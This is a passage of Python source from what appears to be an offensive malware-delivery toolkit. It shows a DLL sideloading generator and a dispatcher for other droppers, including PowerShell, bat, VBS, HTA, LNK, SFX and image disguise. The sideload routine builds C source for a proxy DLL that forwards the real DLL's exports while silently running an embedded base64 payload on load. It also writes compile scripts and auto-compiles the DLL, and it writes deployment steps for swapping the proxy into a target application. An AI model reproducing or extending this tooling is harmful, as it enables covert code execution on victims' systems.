          compile.bat    — tries MinGW-w64 then MSVC cl.exe
          <dll_name>.dll — compiled artifact (if toolchain found)
        """
        os.makedirs(output_dir, exist_ok=True)

        # ── resolve DLL name and exports ──
        if target_dll and os.path.isfile(target_dll):
            out_dll_name = dll_name or os.path.basename(target_dll)
            exports = cls._get_dll_exports(target_dll)
        else:
            # no real DLL supplied — use preset
            if dll_name:
                base = os.path.basename(dll_name).lower()
                if not base.endswith(".dll"):
                    base += ".dll"
            else:
                base = "version.dll"
            out_dll_name = dll_name or base
            # match preset
            exports = []
            for key, names in cls._PRESET_EXPORTS.items():
                if base.endswith(key):
                    exports = names
                    break
            if not exports:
                exports = cls._PRESET_EXPORTS["version.dll"]
            logger.info(f"Sideload preset: {base} ({len(exports)} exports)")

        if not out_dll_name.lower().endswith(".dll"):
            out_dll_name += ".dll"
        dll_stem = os.path.splitext(out_dll_name)[0]
        orig_name = f"orig_{out_dll_name}"      # renamed real DLL
        orig_stem = os.path.splitext(orig_name)[0]

        # ── payload embedding ──
        payload_data = cls._read(payload_path)
        b64_chunks   = cls._b64_c_chunks(payload_data)
        drop_body    = cls._DLL_DROP_EXEC_C.replace("%%B64_CHUNKS%%", b64_chunks)

        # ── forwarding pragmas (MSVC) ──
        pragma_lines = "\n".join(
            f'#pragma comment(linker, "/export:{fn}={orig_stem}.{fn}")'
            for fn in exports
        )

        # ── C source ──
        proxy_body = textwrap.dedent(f"""
            /* ── export forwarding (MSVC linker pragmas) ─────────────── */
            #ifdef _MSC_VER
            {pragma_lines}
            #endif

            BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {{
                (void)reserved;
                if (reason == DLL_PROCESS_ATTACH) {{
                    DisableThreadLibraryCalls(hInst);
                    ThreadedExec();  /* safe: CreateThread is loader-lock-safe */
                }}
                return TRUE;
            }}
        """)

        c_source = drop_body + proxy_body
        c_path   = os.path.join(output_dir, "proxy.c")
        with open(c_path, "w", encoding="utf-8", newline="\n") as f:
            f.write(c_source)

        # ── .def file  (MinGW forwarding — EXPORTS section with forwarder strings) ──
        def_lines = [f"LIBRARY {out_dll_name}", "EXPORTS"]
        for i, fn in enumerate(exports, start=1):
            def_lines.append(f"    {fn}={orig_stem}.{fn} @{i}")
        def_content = "\n".join(def_lines) + "\n"
        def_path = os.path.join(output_dir, "proxy.def")
        with open(def_path, "w", encoding="utf-8", newline="\n") as f:
            f.write(def_content)

        # ── deployment README ──
        readme_lines = [
            f"# DLL Sideload — {out_dll_name}",
            "",
            "## Deployment Steps",
            f"1. Compile proxy.c → {out_dll_name}  (run compile.bat)",
            f"2. In the target app directory:",
            f"   a. Rename  {out_dll_name}  →  {orig_name}",
            f"   b. Drop the compiled  {out_dll_name}  in its place.",
            f"3. Launch the vulnerable application.",
            f"   The proxy will forward all {len(exports)} exports to {orig_name}",
            f"   and execute the payload silently on load.",
            "",
            "## Exported Functions Forwarded",
        ] + [f"  - {fn}" for fn in exports]
        readme_path = os.path.join(output_dir, "DEPLOY.md")
        with open(readme_path, "w", encoding="utf-8") as f:
            f.write("\n".join(readme_lines))

        # ── compile.bat ──
        dll_out  = os.path.join(output_dir, out_dll_name)

        bat_lines = [
            "@echo off",
            f'cd /d "{output_dir}"',
            "",
            ":: ── Try MinGW-w64 ───────────────────────────────────────────",
            f'x86_64-w64-mingw32-gcc -shared -O2 -s -o "{out_dll_name}" proxy.c proxy.def '
            f'-lkernel32 -ladvapi32 -lcrypt32 2>nul',
            f'if exist "{out_dll_name}" (',
            f'    echo [+] MinGW compiled: {out_dll_name}',
            f'    goto :done',
            f')',
            "",
            ":: ── Try MSVC cl.exe ─────────────────────────────────────────",
            f'cl.exe /LD /O2 /Fe:"{out_dll_name}" proxy.c '
            f'/link /DEF:proxy.def '
            f'kernel32.lib advapi32.lib crypt32.lib 2>nul',
            f'if exist "{out_dll_name}" (',
            f'    echo [+] MSVC compiled: {out_dll_name}',
            f'    goto :done',
            f')',
            "",
            f"echo [-] Compilation failed. See proxy.c — needs MinGW-w64 or MSVC.",
            "",
            ":done",
            "echo See DEPLOY.md for deployment instructions.",
            "pause",
        ]
        bat_path = os.path.join(output_dir, "compile.bat")
        with open(bat_path, "w", newline="\r\n") as f:
            f.write("\r\n".join(bat_lines))

        # ── attempt auto-compile ──
        compiled = None
        for compiler_args in [
            [
                "x86_64-w64-mingw32-gcc", "-shared", "-O2", "-s",
                "-o", dll_out, c_path, def_path,
                "-lkernel32", "-ladvapi32", "-lcrypt32",
            ],
            [
                "cl.exe", "/LD", "/O2", f"/Fe:{dll_out}", c_path,
                "/link", f"/DEF:{def_path}",
                "kernel32.lib", "advapi32.lib", "crypt32.lib",
            ],
        ]:
            try:
                r = subprocess.run(
                    compiler_args, capture_output=True, text=True,
                    timeout=60, cwd=output_dir,
                )
                if r.returncode == 0 and os.path.isfile(dll_out):
                    compiled = dll_out
                    logger.info(f"Proxy DLL compiled OK: {dll_out}")
                    break
            except FileNotFoundError:
                pass
            except Exception as exc:
                logger.warning(f"Compile attempt failed: {exc}")

        notes = (
            f"Proxy DLL for {out_dll_name} | {len(exports)} exports forwarded to {orig_name}. "
            f"Payload: {len(payload_data):,} bytes embedded. "
            + (" Auto-compiled OK." if compiled else " Run compile.bat (needs MinGW or MSVC).")
            + " See DEPLOY.md for deployment steps."
        )

        return {
            "type": "dll_sideload",
            "c_source": c_path,
            "def_file": def_path,
            "compile_bat": bat_path,
            "readme": readme_path,
            "compiled": compiled,
            "dll_name": out_dll_name,
            "orig_name": orig_name,
            "export_count": len(exports),
            "notes": notes,
        }

    # ════════════════════════════════════════════════════════════════
    #  GENERATE SELECTED METHOD
    # ════════════════════════════════════════════════════════════════
    @classmethod
    def generate(
        cls,
        method: str,
        payload_path: str,
        output_dir: str,
        *,
        decoy_image: str | None = None,
        hosted_url: str | None = None,
        dll_name: str | None = None,
        sideload_target: str | None = None,
    ) -> dict:
        """Dispatch to the appropriate generator by name.

        Valid methods: image, powershell, bat, vbs, hta, lnk, sfx,
                       dll, dll_sideload, all
        """
        match method:
            case "image":
                if not decoy_image or not os.path.isfile(decoy_image):
                    return {"error": "Image disguise requires --decoy-image"}
                return cls.image_disguise(
                    payload_path, decoy_image,
                    os.path.join(output_dir, "image_disguise"),
                )
            case "powershell" | "ps":
                return cls.powershell_oneliner(
                    payload_path,
                    os.path.join(output_dir, "powershell"),
                    hosted_url,
                )
            case "bat":
                return cls.bat_dropper(
                    payload_path,
                    os.path.join(output_dir, "bat"),
                )
            case "vbs":
                return cls.vbs_dropper(
                    payload_path,
                    os.path.join(output_dir, "vbs"),
                )
            case "hta":
                return cls.hta_dropper(
                    payload_path,
                    os.path.join(output_dir, "hta"),
                )
            case "lnk":
                return cls.lnk_shortcut(
                    payload_path,
                    os.path.join(output_dir, "lnk"),
                    hosted_url,
                )
            case "sfx":
                return cls.sfx_archive(
                    payload_path,
                    os.path.join(output_dir, "sfx"),
                )
            case "dll":
                return cls.dll_create(
                    payload_path,
                    os.path.join(output_dir, "dll_create"),
                    dll_name=dll_name,
                )
            case "dll_sideload":
                return cls.dll_sideload(
                    payload_path,
                    os.path.join(output_dir, "dll_sideload"),
                    target_dll=sideload_target,
                    dll_name=dll_name,
                )
            case "all":
                results = {}
                for m in ("powershell", "bat", "vbs", "hta", "lnk", "sfx",
                           "dll", "dll_sideload"):
                    try:
                        results[m] = cls.generate(
                            m, payload_path, output_dir,
                            hosted_url=hosted_url,
                            dll_name=dll_name,
                            sideload_target=sideload_target,
                        )
                    except Exception as exc:
                        results[m] = {"error": str(exc)}
                if decoy_image and os.path.isfile(decoy_image):
                    try:
                        results["image"] = cls.generate(
                            "image", payload_path, output_dir,
                            decoy_image=decoy_image,
                        )
                    except Exception as exc:
                        results["image"] = {"error": str(exc)}
                return results
            case _:
                return {"error": f"Unknown delivery method: {method}"}
